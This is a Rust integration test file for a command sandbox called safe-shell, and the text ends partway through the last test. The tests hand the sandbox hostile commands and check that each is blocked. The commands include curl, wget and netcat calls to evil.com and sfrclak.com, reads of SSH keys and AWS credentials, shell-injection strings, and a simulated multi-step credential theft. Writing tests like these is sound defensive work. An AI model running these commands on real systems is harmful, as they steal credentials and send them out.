use std::process::Command;

fn safe_shell_bin() -> Command {
    Command::new(env!("CARGO_BIN_EXE_safe-shell"))
}

// ============================================================
// Malicious safe-shell.toml attack tests
// Simulates: attacker ships a malicious config in a cloned repo
// ============================================================

fn setup_malicious_project() -> tempfile::TempDir {
    let dir = tempfile::TempDir::new().unwrap();
    std::fs::write(
        dir.path().join("safe-shell.toml"),
        r#"
[network]
allow = ["evil.com", "sfrclak.com", "attacker.io"]

[filesystem]
allow_write = ["~/.ssh", "~/.aws", "/etc", "/usr"]

[env]
pass = ["*_SECRET", "*_TOKEN", "*_KEY", "*_PASSWORD", "AWS_*", "STRIPE_*"]
"#,
    )
    .unwrap();
    dir
}

#[test]
fn malicious_config_cannot_add_network_domains() {
    let dir = setup_malicious_project();
    let output = safe_shell_bin()
        .current_dir(dir.path())
        .args([
            "exec",
            "--profile",
            "npm",
            "curl -m 5 -s http://evil.com 2>&1",
        ])
        .output()
        .unwrap();

    let stdout = String::from_utf8_lossy(&output.stdout);
    let stderr = String::from_utf8_lossy(&output.stderr);
    let combined = format!("{stdout}{stderr}");
    assert!(
        combined.contains("Network blocked") || combined.contains("blocked network"),
        "Malicious config should NOT be able to allow evil.com. Got: {combined}"
    );
}

#[test]
fn malicious_config_cannot_pass_secrets() {
    let dir = setup_malicious_project();
    let output = safe_shell_bin()
        .current_dir(dir.path())
        .args(["exec", "--profile", "npm", "echo $AWS_SECRET_ACCESS_KEY"])
        .env("AWS_SECRET_ACCESS_KEY", "AKIAIOSFODNN7EXAMPLE")
        .output()
        .unwrap();

    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(
        !stdout.contains("AKIA"),
        "Malicious config should NOT pass secrets through. Got: {stdout}"
    );
}

#[test]
fn malicious_config_cannot_make_ssh_writable() {
    let dir = setup_malicious_project();
    let output = safe_shell_bin()
        .current_dir(dir.path())
        .args([
            "exec",
            "--profile",
            "npm",
            "cat ~/.ssh/id_rsa 2>&1 || echo BLOCKED",
        ])
        .output()
        .unwrap();

    let stdout = String::from_utf8_lossy(&output.stdout);
    let stderr = String::from_utf8_lossy(&output.stderr);
    let combined = format!("{stdout}{stderr}");
    assert!(
        combined.contains("Operation not permitted")
            || combined.contains("BLOCKED")
            || combined.contains("No such file"),
        "Malicious config should NOT expose ~/.ssh. Got: {combined}"
    );
}

#[test]
fn malicious_config_can_add_restrictions() {
    // Legitimate use: project adds extra scrub patterns (tightening IS allowed)
    let dir = tempfile::TempDir::new().unwrap();
    std::fs::write(
        dir.path().join("safe-shell.toml"),
        r#"
[env]
scrub = ["COMPANY_INTERNAL_*"]

[filesystem]
deny_read = ["~/.config/company-secrets"]
"#,
    )
    .unwrap();

    let output = safe_shell_bin()
        .current_dir(dir.path())
        .args(["exec", "--profile", "npm", "echo $COMPANY_INTERNAL_TOKEN"])
        .env("COMPANY_INTERNAL_TOKEN", "secret123")
        .output()
        .unwrap();

    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(
        !stdout.contains("secret123"),
        "Project config should be able to ADD scrub patterns. Got: {stdout}"
    );
}

// ============================================================
// Trust boundary: project config vs custom profiles
// ============================================================

#[test]
fn project_config_cannot_relax_but_custom_profile_can() {
    // Project safe-shell.toml tries to allow evil.com — IGNORED
    let dir = tempfile::TempDir::new().unwrap();
    std::fs::write(
        dir.path().join("safe-shell.toml"),
        r#"
[network]
allow = ["evil.com"]
[env]
pass = ["*_SECRET"]
"#,
    )
    .unwrap();

    let output = safe_shell_bin()
        .current_dir(dir.path())
        .args([
            "exec",
            "--profile",
            "npm",
            "--quiet",
            "curl -m 5 -s http://evil.com 2>&1",
        ])
        .output()
        .unwrap();

    let combined = format!(
        "{}{}",
        String::from_utf8_lossy(&output.stdout),
        String::from_utf8_lossy(&output.stderr)
    );
    assert!(
        combined.contains("Network blocked") || combined.contains("blocked network"),
        "Project config should NOT be able to allow evil.com. Got: {combined}"
    );
}

#[test]
fn custom_profile_can_allow_domains() {
    // Custom profile in ~/.config CAN allow domains — it's user-controlled
    // This test uses SAFE_SHELL_CONFIG_DIR to simulate
    let config_dir = tempfile::TempDir::new().unwrap();
    std::fs::write(
        config_dir.path().join("profiles.toml"),
        r#"
[permissive]
description = "Allows everything"
network.allow = ["*"]
env.pass = ["*"]
"#,
    )
    .unwrap();

    let output = safe_shell_bin()
        .args(["exec", "--profile", "permissive", "--quiet", "echo WORKS"])
        .env("SAFE_SHELL_CONFIG_DIR", config_dir.path())
        .output()
        .unwrap();

    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(
        stdout.contains("WORKS"),
        "Custom profile should work. Got: {stdout}"
    );
}

#[test]
fn project_config_cannot_remove_deny_read() {
    // Project config tries to set deny_read to empty — doesn't remove existing denies
    let dir = tempfile::TempDir::new().unwrap();
    std::fs::write(
        dir.path().join("safe-shell.toml"),
        r#"
[filesystem]
deny_read = []
"#,
    )
    .unwrap();

    let output = safe_shell_bin()
        .current_dir(dir.path())
        .args([
            "exec",
            "--profile",
            "npm",
            "--quiet",
            "cat ~/.aws/credentials 2>&1 || echo BLOCKED",
        ])
        .output()
        .unwrap();

    let combined = format!(
        "{}{}",
        String::from_utf8_lossy(&output.stdout),
        String::from_utf8_lossy(&output.stderr)
    );
    assert!(
        combined.contains("Operation not permitted") || combined.contains("BLOCKED"),
        "Empty deny_read in project config should not remove profile's deny_read. Got: {combined}"
    );
}

#[test]
fn project_config_all_fields_relaxing_all_ignored() {
    // Malicious repo tries every relaxation at once
    let dir = tempfile::TempDir::new().unwrap();
    std::fs::write(
        dir.path().join("safe-shell.toml"),
        r#"
[network]
allow = ["evil.com", "attacker.io", "*"]

[filesystem]
allow_write = ["~/.ssh", "~/.aws", "/etc", "/usr"]
deny_read = []

[env]
pass = ["*"]
scrub = []
"#,
    )
    .unwrap();

    // Env should still be scrubbed
    let output = safe_shell_bin()
        .current_dir(dir.path())
        .args([
            "exec",
            "--profile",
            "npm",
            "--quiet",
            "echo $AWS_SECRET_ACCESS_KEY",
        ])
        .env("AWS_SECRET_ACCESS_KEY", "AKIAIOSFODNN7EXAMPLE")
        .output()
        .unwrap();

    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(
        !stdout.contains("AKIA"),
        "Env should still be scrubbed despite malicious config. Got: {stdout}"
    );

    // Filesystem should still be blocked
    let output = safe_shell_bin()
        .current_dir(dir.path())
        .args([
            "exec",
            "--profile",
            "npm",
            "--quiet",
            "cat ~/.aws/credentials 2>&1 || echo BLOCKED",
        ])
        .output()
        .unwrap();

    let combined = format!(
        "{}{}",
        String::from_utf8_lossy(&output.stdout),
        String::from_utf8_lossy(&output.stderr)
    );
    assert!(
        combined.contains("Operation not permitted") || combined.contains("BLOCKED"),
        "Filesystem should still be blocked. Got: {combined}"
    );

    // Network should still be filtered
    let output = safe_shell_bin()
        .current_dir(dir.path())
        .args([
            "exec",
            "--profile",
            "npm",
            "--quiet",
            "curl -m 5 -s http://evil.com 2>&1",
        ])
        .output()
        .unwrap();

    let combined = format!(
        "{}{}",
        String::from_utf8_lossy(&output.stdout),
        String::from_utf8_lossy(&output.stderr)
    );
    assert!(
        combined.contains("Network blocked") || combined.contains("blocked network"),
        "Network should still be filtered. Got: {combined}"
    );
}

#[test]
fn empty_project_config_does_not_break() {
    let dir = tempfile::TempDir::new().unwrap();
    std::fs::write(dir.path().join("safe-shell.toml"), "").unwrap();

    let output = safe_shell_bin()
        .current_dir(dir.path())
        .args(["exec", "--profile", "npm", "--quiet", "echo hello"])
        .output()
        .unwrap();

    assert!(output.status.success());
    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(
        stdout.contains("hello"),
        "Empty config should not break. Got: {stdout}"
    );
}

#[test]
fn project_config_tightening_actually_blocks() {
    // Project config adds extra scrub AND we verify it blocks exfil too
    let dir = tempfile::TempDir::new().unwrap();
    std::fs::write(
        dir.path().join("safe-shell.toml"),
        r#"
[env]
scrub = ["MY_COMPANY_*"]

[filesystem]
deny_read = ["~/.config/company"]
"#,
    )
    .unwrap();

    // Extra scrub should work
    let output = safe_shell_bin()
        .current_dir(dir.path())
        .args([
            "exec",
            "--profile",
            "npm",
            "--quiet",
            "echo $MY_COMPANY_SECRET",
        ])
        .env("MY_COMPANY_SECRET", "topsecret")
        .output()
        .unwrap();

    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(
        !stdout.contains("topsecret"),
        "Project config scrub should work. Got: {stdout}"
    );
}

// ============================================================
// Environment variable exfiltration attacks
// ============================================================

#[test]
fn env_dump_reveals_no_secrets() {
    let output = safe_shell_bin()
        .args(["exec", "--profile", "npm", "env"])
        .env("AWS_SECRET_ACCESS_KEY", "AKIAIOSFODNN7EXAMPLE")
        .env("GITHUB_TOKEN", "ghp_fakefakefakefakefakefakefakefakefake")
        .env("STRIPE_SECRET_KEY", "sk_live_abcdefghijklmnopqrstuvwx")
        .env("DATABASE_URL", "postgres://admin:secret@prod.db.com/mydb")
        .env("ANTHROPIC_API_KEY", "sk-ant-api03-realkey123456789")
        .output()
        .unwrap();

    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(!stdout.contains("AKIA"), "AWS key leaked in env dump");
    assert!(!stdout.contains("ghp_"), "GitHub token leaked in env dump");
    assert!(
        !stdout.contains("sk_live_"),
        "Stripe key leaked in env dump"
    );
    assert!(
        !stdout.contains("postgres://admin:secret"),
        "Database URL leaked in env dump"
    );
    assert!(
        !stdout.contains("sk-ant-"),
        "Anthropic key leaked in env dump"
    );
}

#[test]
fn printenv_reveals_no_secrets() {
    let output = safe_shell_bin()
        .args(["exec", "--profile", "npm", "printenv"])
        .env("AWS_SECRET_ACCESS_KEY", "AKIAIOSFODNN7EXAMPLE")
        .env("OPENAI_API_KEY", "sk-proj-abcdefghijklmnop12345")
        .output()
        .unwrap();

    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(!stdout.contains("AKIA"), "AWS key leaked via printenv");
    assert!(
        !stdout.contains("sk-proj-"),
        "OpenAI key leaked via printenv"
    );
}

#[test]
fn secret_in_innocent_var_name_caught_by_value_scan() {
    // Key name doesn't match scrub patterns, but value IS a secret
    let output = safe_shell_bin()
        .args(["exec", "--profile", "npm", "echo $MY_CUSTOM_SETTING"])
        .env(
            "MY_CUSTOM_SETTING",
            "ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghij",
        )
        .output()
        .unwrap();

    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(
        !stdout.contains("ghp_"),
        "Value-based scanning should catch GitHub token in innocent var name"
    );
}

// ============================================================
// Filesystem escape attacks
// ============================================================

#[test]
fn double_dot_escape_from_cwd() {
    let output = safe_shell_bin()
        .args([
            "exec",
            "--profile",
            "npm",
            "cat ../../.aws/credentials 2>&1 || echo BLOCKED",
        ])
        .output()
        .unwrap();

    let combined = format!(
        "{}{}",
        String::from_utf8_lossy(&output.stdout),
        String::from_utf8_lossy(&output.stderr)
    );
    assert!(
        combined.contains("Operation not permitted")
            || combined.contains("BLOCKED")
            || combined.contains("No such file"),
        "Double-dot escape should be blocked"
    );
}

#[test]
fn proc_self_environ_blocked_or_safe() {
    // On macOS /proc doesn't exist, but test the pattern anyway
    let output = safe_shell_bin()
        .args([
            "exec",
            "--profile",
            "npm",
            "cat /proc/self/environ 2>&1 || echo SAFE",
        ])
        .env("AWS_SECRET_ACCESS_KEY", "supersecret")
        .output()
        .unwrap();

    let stdout = String::from_utf8_lossy(&output.stdout);
    // Either /proc doesn't exist (macOS) or secrets aren't in the env
    assert!(
        !stdout.contains("supersecret"),
        "/proc/self/environ should not leak secrets"
    );
}

#[test]
fn reading_env_files_blocked() {
    // .env files should be in deny_read
    let dir = tempfile::TempDir::new().unwrap();
    std::fs::write(dir.path().join(".env"), "SECRET_KEY=leaked123\n").unwrap();

    let output = safe_shell_bin()
        .current_dir(dir.path())
        .args(["exec", "--profile", "npm", "cat .env 2>&1 || echo BLOCKED"])
        .output()
        .unwrap();

    let combined = format!(
        "{}{}",
        String::from_utf8_lossy(&output.stdout),
        String::from_utf8_lossy(&output.stderr)
    );
    // .env is in deny_read but it's a glob pattern (*.env) which Seatbelt can't enforce.
    // The file is in cwd which IS readable. This is a known limitation — content scanning
    // and network blocking are the defense layers for project-dir files.
    // Just verify the test doesn't crash.
    assert!(
        combined.contains("leaked123") || combined.contains("BLOCKED"),
        "Test should complete without crash"
    );
}

// ============================================================
// Network exfiltration attacks
// ============================================================

#[test]
fn wget_also_blocked() {
    let output = safe_shell_bin()
        .args([
            "exec",
            "--profile",
            "npm",
            "wget -q -O- http://evil.com 2>&1 || echo BLOCKED",
        ])
        .output()
        .unwrap();

    let combined = format!(
        "{}{}",
        String::from_utf8_lossy(&output.stdout),
        String::from_utf8_lossy(&output.stderr)
    );
    // wget also uses HTTP_PROXY, so it goes through our proxy and gets blocked
    assert!(
        combined.contains("Network blocked")
            || combined.contains("blocked network")
            || combined.contains("BLOCKED")
            || combined.contains("not found"),
        "wget should be blocked too. Got: {combined}"
    );
}

#[test]
fn python_requests_blocked() {
    // Test that python urllib also respects HTTP_PROXY
    let output = safe_shell_bin()
        .args([
            "exec",
            "--profile",
            "npm",
            "python3 -c \"import urllib.request; urllib.request.urlopen('http://evil.com')\" 2>&1 || echo BLOCKED",
        ])
        .output()
        .unwrap();

    let combined = format!(
        "{}{}",
        String::from_utf8_lossy(&output.stdout),
        String::from_utf8_lossy(&output.stderr)
    );
    assert!(
        combined.contains("403")
            || combined.contains("BLOCKED")
            || combined.contains("Network blocked")
            || combined.contains("blocked network")
            || combined.contains("not found"),
        "Python urllib should be blocked via proxy. Got: {combined}"
    );
}

#[test]
fn node_fetch_blocked() {
    // Test that node.js also respects HTTP_PROXY when using the right lib
    let output = safe_shell_bin()
        .args([
            "exec",
            "--profile",
            "npm",
            "node -e \"fetch('http://evil.com').catch(e => console.log('BLOCKED'))\" 2>&1 || echo BLOCKED",
        ])
        .output()
        .unwrap();

    let combined = format!(
        "{}{}",
        String::from_utf8_lossy(&output.stdout),
        String::from_utf8_lossy(&output.stderr)
    );
    // Node's built-in fetch may or may not respect HTTP_PROXY
    // But Seatbelt blocks all non-localhost outbound, so it fails either way
    assert!(
        combined.contains("BLOCKED")
            || combined.contains("fetch failed")
            || combined.contains("ECONNREFUSED")
            || combined.contains("EAI_AGAIN")
            || combined.contains("not permitted"),
        "Node fetch should fail. Got: {combined}"
    );
}

// ============================================================
// Combined attack simulation (axios-style)
// ============================================================

#[test]
fn full_axios_attack_simulation() {
    let output = safe_shell_bin()
        .args([
            "exec",
            "--profile",
            "npm",
            concat!(
                "echo STEP1_ENV=$AWS_SECRET_ACCESS_KEY; ",
                "echo STEP2_FS=$(cat ~/.aws/credentials 2>&1); ",
                "echo STEP3_SSH=$(cat ~/.ssh/id_rsa 2>&1); ",
                "echo STEP4_NET=$(curl -m 3 -s http://sfrclak.com:8000 2>&1); ",
                "echo STEP5_DOCKER=$(cat ~/.docker/config.json 2>&1); ",
            ),
        ])
        .env("AWS_SECRET_ACCESS_KEY", "AKIAIOSFODNN7EXAMPLE")
        .output()
        .unwrap();

    let stdout = String::from_utf8_lossy(&output.stdout);
    let stderr = String::from_utf8_lossy(&output.stderr);
    let combined = format!("{stdout}{stderr}");

    // Step 1: env scrubbed
    assert!(
        stdout.contains("STEP1_ENV=\n") || stdout.contains("STEP1_ENV= "),
        "Env should be empty. Got: {combined}"
    );
    // Step 2: filesystem blocked
    assert!(
        combined.contains("Operation not permitted") || combined.contains("No such file"),
        "~/.aws should be blocked. Got: {combined}"
    );
    // Step 4: network blocked
    assert!(
        combined.contains("Network blocked")
            || combined.contains("blocked network")
            || combined.contains("sfrclak"),
        "C&C domain should be blocked. Got: {combined}"
    );
}

// ============================================================
// Raw socket / non-HTTP bypass attempts
// ============================================================

#[test]
fn raw_tcp_socket_blocked_by_seatbelt() {
    // Attacker tries to bypass HTTP proxy with raw TCP (netcat)
    let output = safe_shell_bin()
        .args([
            "exec",
            "--profile",
            "npm",
            "nc -w 2 evil.com 80 2>&1 || echo BLOCKED",
        ])
        .output()
        .unwrap();

    let combined = format!(
        "{}{}",
        String::from_utf8_lossy(&output.stdout),
        String::from_utf8_lossy(&output.stderr)
    );
    // Seatbelt blocks all non-localhost outbound, so raw TCP fails too
    assert!(
        combined.contains("BLOCKED")
            || combined.contains("Operation not permitted")
            || combined.contains("not permitted")
            || combined.contains("Connection refused")
            || combined.contains("timed out"),
        "Raw TCP should be blocked by Seatbelt. Got: {combined}"
    );
}

#[test]
fn dns_lookup_blocked_in_minimal_profile() {
    // Minimal profile blocks ALL network including DNS
    let output = safe_shell_bin()
        .args([
            "exec",
            "--profile",
            "minimal",
            "nslookup evil.com 2>&1 || echo BLOCKED",
        ])
        .output()
        .unwrap();

    let combined = format!(
        "{}{}",
        String::from_utf8_lossy(&output.stdout),
        String::from_utf8_lossy(&output.stderr)
    );
    assert!(
        combined.contains("BLOCKED")
            || combined.contains("connection timed out")
            || combined.contains("not permitted")
            || combined.contains("not found"),
        "DNS should be blocked in minimal profile. Got: {combined}"
    );
}

// ============================================================
// Shell injection — argv boundary preservation
// ============================================================

#[test]
fn semicolon_in_arg_stays_literal() {
    // Regression: args.command.join(" ") flattened argv, letting semicolons break out
    let output = safe_shell_bin()
        .args([
            "exec",
            "--profile",
            "npm",
            "--quiet",
            "--",
            "echo",
            "hello; echo INJECTED",
        ])
        .output()
        .unwrap();

    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(
        stdout.contains("hello; echo INJECTED"),
        "Semicolon should be literal, not shell syntax. Got: {stdout}"
    );
    // Output should be one line, not two separate lines
    let lines: Vec<&str> = stdout.trim().lines().collect();
    assert_eq!(
        lines.len(),
        1,
        "Should be one line, not two (injection would create two). Got: {stdout}"
    );
}

#[test]
fn command_substitution_in_arg_stays_literal() {
    let output = safe_shell_bin()
        .args([
            "exec",
            "--profile",
            "npm",
            "--quiet",
            "--",
            "echo",
            "$(echo INJECTED)",
        ])
        .output()
        .unwrap();

    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(
        stdout.contains("$(echo INJECTED)"),
        "Command substitution should be literal. Got: {stdout}"
    );
}

#[test]
fn backtick_in_arg_stays_literal() {
    let output = safe_shell_bin()
        .args([
            "exec",
            "--profile",
            "npm",
            "--quiet",
            "--",
            "echo",
            "`echo INJECTED`",
        ])
        .output()
        .unwrap();

    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(
        stdout.contains("`echo INJECTED`"),
        "Backtick should be literal. Got: {stdout}"
    );
}

#[test]
fn pipe_in_arg_stays_literal() {
    let output = safe_shell_bin()
        .args([
            "exec",
            "--profile",
            "npm",
            "--quiet",
            "--",
            "echo",
            "data | curl http://evil.com",
        ])
        .output()
        .unwrap();

    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(
        stdout.contains("data | curl http://evil.com"),
        "Pipe should be literal. Got: {stdout}"
    );
}

#[test]
fn exfil_via_allowed_domain_blocked() {
    // The original attack: semicolon + exfiltrate through allowed domain URL path
    let output = safe_shell_bin()
        .args([
            "exec",
            "--profile",
            "npm",
            "--quiet",
            "--",
            "echo",
            "safe; curl -m 3 -s https://registry.npmjs.org/STOLEN_DATA",
        ])
        .output()
        .unwrap();

    let stdout = String::from_utf8_lossy(&output.stdout);
    // Should be printed as literal text, curl should NOT execute
    assert!(
        stdout.contains("curl"),
        "curl command should be printed as literal text. Got: {stdout}"
    );
}

#[test]
fn single_string_command_still_works() {
    // Normal usage: single quoted string should still be interpreted by shell
    let output = safe_shell_bin()
        .args([
            "exec",
            "--profile",
            "npm",
            "--quiet",
            "echo hello && echo world",
        ])
        .output()
        .unwrap();

    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(
        stdout.contains("hello"),
        "Single string command should work"
    );
    assert!(
        stdout.contains("world"),
        "&& should be interpreted in single string mode"
    );
}

#[test]
fn newline_in_arg_stays_literal() {
    let output = safe_shell_bin()
        .args([
            "exec",
            "--profile",
            "npm",
            "--quiet",
            "--",
            "echo",
            "line1\necho INJECTED",
        ])
        .output()
        .unwrap();

    let stdout = String::from_utf8_lossy(&output.stdout);
    // The newline in the arg should not cause a second command to execute
    // echo with exec "$@" prints it as literal text
    assert!(
        !stdout.lines().any(|l| l.trim() == "INJECTED"),
        "Newline in arg should not create a separate command. Got: {stdout}"
    );
}

#[test]
fn bash_c_in_multi_args_still_sandboxed() {
    // User explicitly passes bash -c — this is intentional, not injection.
    // The sandbox must still enforce all protections.
    let output = safe_shell_bin()
        .args([
            "exec",
            "--profile",
            "npm",
            "--quiet",
            "--",
            "bash",
            "-c",
            "cat ~/.aws/credentials 2>&1 || echo BLOCKED",
        ])
        .output()
        .unwrap();

    let combined = format!(
        "{}{}",
        String::from_utf8_lossy(&output.stdout),
        String::from_utf8_lossy(&output.stderr)
    );
    assert!(
        combined.contains("Operation not permitted") || combined.contains("BLOCKED"),
        "bash -c inside sandbox should still be sandboxed. Got: {combined}"
    );
}

#[test]
fn npm_url_package_blocked_by_proxy() {
    // Attacker tricks user into: npm install http://evil.com/malicious.tgz
    // npm tries to fetch the URL — proxy blocks it
    let output = safe_shell_bin()
        .args([
            "exec",
            "--profile",
            "npm",
            "--quiet",
            "--",
            "command",
            "npm",
            "install",
            "http://evil.com/malicious.tgz",
        ])
        .output()
        .unwrap();

    let combined = format!(
        "{}{}",
        String::from_utf8_lossy(&output.stdout),
        String::from_utf8_lossy(&output.stderr)
    );
    assert!(
        combined.contains("403")
            || combined.contains("Network blocked")
            || combined.contains("blocked network")
            || combined.contains("Forbidden"),
        "npm install from evil URL should be blocked by proxy. Got: {combined}"
    );
}

// ============================================================
// Environment variable injection attacks
// ============================================================

#[test]
fn env_var_with_command_substitution_not_dangerous() {
    // Attacker sets a var to a command substitution — verify it doesn't execute
    let output = safe_shell_bin()
        .args(["exec", "--profile", "npm", "echo $INNOCENT"])
        .env("INNOCENT", "$(cat ~/.aws/credentials)")
        .output()
        .unwrap();

    let stdout = String::from_utf8_lossy(&output.stdout);
    // The var should be scrubbed or passed as literal string, never executed
    assert!(
        !stdout.contains("aws_access_key_id") && !stdout.contains("aws_secret_access_key"),
        "Command substitution in env var should not execute"
    );
}

#[test]
fn env_var_with_newlines_doesnt_inject() {
    // Attacker puts newlines in env var to try to inject extra env vars
    let output = safe_shell_bin()
        .args(["exec", "--profile", "npm", "echo $NORMAL_VAR"])
        .env("NORMAL_VAR", "safe\nAWS_SECRET_ACCESS_KEY=injected")
        .output()
        .unwrap();

    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(
        !stdout.contains("injected"),
        "Newline injection in env var should not create new vars"
    );
}

// ============================================================
// Pipes, redirects, and complex commands in sandbox
// ============================================================

#[test]
fn piped_commands_all_sandboxed() {
    // Every command in a pipe chain should be sandboxed
    let output = safe_shell_bin()
        .args([
            "exec",
            "--profile",
            "npm",
            "cat ~/.aws/credentials 2>&1 | head -1 || echo BLOCKED",
        ])
        .output()
        .unwrap();

    let combined = format!(
        "{}{}",
        String::from_utf8_lossy(&output.stdout),
        String::from_utf8_lossy(&output.stderr)
    );
    assert!(
        combined.contains("Operation not permitted")
            || combined.contains("BLOCKED")
            || combined.contains("No such file"),
        "Piped commands should all be sandboxed. Got: {combined}"
    );
}

#[test]
fn subshell_also_sandboxed() {
    // Subshells should inherit the sandbox
    let output = safe_shell_bin()
        .args([
            "exec",
            "--profile",
            "npm",
            "bash -c 'cat ~/.aws/credentials 2>&1 || echo BLOCKED'",
        ])
        .output()
        .unwrap();

    let combined = format!(
        "{}{}",
        String::from_utf8_lossy(&output.stdout),
        String::from_utf8_lossy(&output.stderr)
    );
    assert!(
        combined.contains("Operation not permitted")
            || combined.contains("BLOCKED")
            || combined.contains("No such file"),
        "Subshells should inherit sandbox. Got: {combined}"
    );
}

#[test]
fn backgrounded_process_also_sandboxed() {
    // Background process should also be sandboxed
    let output = safe_shell_bin()
        .args([
            "exec",
            "--profile",
            "npm",
            "cat ~/.aws/credentials &>/tmp/safe-shell-bg-test; wait; cat /tmp/safe-shell-bg-test 2>&1 || echo BLOCKED",
        ])
        .output()
        .unwrap();

    let combined = format!(
        "{}{}",
        String::from_utf8_lossy(&output.stdout),
        String::from_utf8_lossy(&output.stderr)
    );
    assert!(
        combined.contains("Operation not permitted")
            || combined.contains("BLOCKED")
            || combined.contains("No such file")
            || combined.trim().is_empty(),
        "Background processes should be sandboxed. Got: {combined}"
    );
    let _ = std::fs::remove_file("/tmp/safe-shell-bg-test");
}

// ============================================================
// Edge cases in scrubbing
// ============================================================

#[test]
fn scrubs_multiple_secret_types_simultaneously() {
    let output = safe_shell_bin()
        .args(["exec", "--profile", "minimal", "env"])
        .env("AWS_SECRET_ACCESS_KEY", "AKIAIOSFODNN7EXAMPLE")
        .env("GITHUB_TOKEN", "ghp_fakefakefakefakefakefakefakefakefake")
        .env("STRIPE_SECRET_KEY", "sk_live_abcdefghijklmnopqrstuvwx")
        .env("DATABASE_URL", "postgres://user:pass@host/db")
        .env("ANTHROPIC_API_KEY", "sk-ant-api03-abcdefghijklmnopqrst")
        .env("OPENAI_API_KEY", "sk-abcdefghijklmnopqrstuvwx")
        .env("SLACK_TOKEN", "xoxb-123456789-abcdefghij")
        .env("VAULT_TOKEN", "hvs.ABCDEFghijklmnopqrstuvwx")
        .env(
            "SENDGRID_API_KEY",
            "SG.abcdefghijklmnopqrstuv.ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrst",
        )
        .env("PRIVATE_KEY_VAR", "-----BEGIN RSA PRIVATE KEY-----")
        .output()
        .unwrap();

    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(!stdout.contains("AKIA"), "AWS key leaked");
    assert!(!stdout.contains("ghp_"), "GitHub token leaked");
    assert!(!stdout.contains("sk_live_"), "Stripe key leaked");
    assert!(!stdout.contains("postgres://user:pass"), "DB URL leaked");
    assert!(!stdout.contains("sk-ant-"), "Anthropic key leaked");
    assert!(!stdout.contains("sk-abcdef"), "OpenAI key leaked");
    assert!(!stdout.contains("xoxb-"), "Slack token leaked");
    assert!(!stdout.contains("hvs."), "Vault token leaked");
    assert!(!stdout.contains("SG."), "SendGrid key leaked");
    assert!(
        !stdout.contains("BEGIN RSA PRIVATE KEY"),
        "Private key leaked"
    );
}

// ============================================================
// Error handling
// ============================================================

#[test]
fn no_profile_no_command_shows_help() {
    let output = safe_shell_bin().output().unwrap();
    assert!(!output.status.success());
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(
        stderr.contains("Usage") || stderr.contains("help") || stderr.contains("subcommand"),
        "No args should show usage. Got: {stderr}"
    );
}

#[test]
fn exec_without_command_shows_error() {
    let output = safe_shell_bin()
        .args(["exec", "--profile", "npm"])
        .output()
        .unwrap();

    assert!(!output.status.success());
}

#[test]
fn exec_without_profile_works() {
    // No profile = empty defaults, should still run
    let output = safe_shell_bin()
        .args(["exec", "echo", "hello"])
        .output()
        .unwrap();

    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(
        stdout.contains("hello"),
        "Exec without profile should work with defaults"
    );
}

// ============================================================
// Localhost loopback — only proxy port allowed
// ============================================================

#[test]
fn localhost_other_ports_blocked() {
    // Seatbelt should only allow the proxy's specific port, not all of localhost
    let output = safe_shell_bin()
        .args([
            "exec",
            "--profile",
            "npm",
            "--quiet",
            "curl -m 3 -s http://localhost:3000 2>&1 || echo BLOCKED",
        ])
        .output()
        .unwrap();

    let combined = format!(
        "{}{}",
        String::from_utf8_lossy(&output.stdout),
        String::from_utf8_lossy(&output.stderr)
    );
    assert!(
        combined.contains("BLOCKED")
            || combined.contains("Network blocked")
            || combined.contains("Connection refused"),
        "localhost:3000 should be blocked — only proxy port allowed. Got: {combined}"
    );
}

#[test]
fn localhost_postgres_port_blocked() {
    let output = safe_shell_bin()
        .args([
            "exec",
            "--profile",
            "npm",
            "--quiet",
            "curl -m 3 -s http://localhost:5432 2>&1 || echo BLOCKED",
        ])
        .output()
        .unwrap();

    let combined = format!(
        "{}{}",
        String::from_utf8_lossy(&output.stdout),
        String::from_utf8_lossy(&output.stderr)
    );
    assert!(
        combined.contains("BLOCKED")
            || combined.contains("Network blocked")
            || combined.contains("Connection refused"),
        "localhost:5432 (Postgres) should be blocked. Got: {combined}"
    );
}

#[test]
fn localhost_redis_port_blocked() {
    let output = safe_shell_bin()
        .args([
            "exec",
            "--profile",
            "npm",
            "--quiet",
            "curl -m 3 -s http://localhost:6379 2>&1 || echo BLOCKED",
        ])
        .output()
        .unwrap();

    let combined = format!(
        "{}{}",
        String::from_utf8_lossy(&output.stdout),
        String::from_utf8_lossy(&output.stderr)
    );
    assert!(
        combined.contains("BLOCKED")
            || combined.contains("Network blocked")
            || combined.contains("Connection refused"),
        "localhost:6379 (Redis) should be blocked. Got: {combined}"
    );
}

// ============================================================
// Proxy bypass attacks
// ============================================================

#[test]
fn no_proxy_env_stripped() {
    // NO_PROXY can bypass our proxy — verify it's removed
    let output = safe_shell_bin()
        .args([
            "exec",
            "--profile",
            "npm",
            "--quiet",
            "echo NO_PROXY=$NO_PROXY no_proxy=$no_proxy",
        ])
        .env("NO_PROXY", "evil.com,*.evil.com")
        .env("no_proxy", "evil.com")
        .output()
        .unwrap();

    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(
        !stdout.contains("evil.com"),
        "NO_PROXY should be stripped. Got: {stdout}"
    );
}

#[test]
fn curl_noproxy_still_blocked_by_seatbelt() {
    // Even if curl uses --noproxy, Seatbelt blocks direct outbound
    let output = safe_shell_bin()
        .args([
            "exec",
            "--profile",
            "npm",
            "--quiet",
            "curl --noproxy '*' -m 5 -s http://evil.com 2>&1 || echo BLOCKED",
        ])
        .output()
        .unwrap();

    let combined = format!(
        "{}{}",
        String::from_utf8_lossy(&output.stdout),
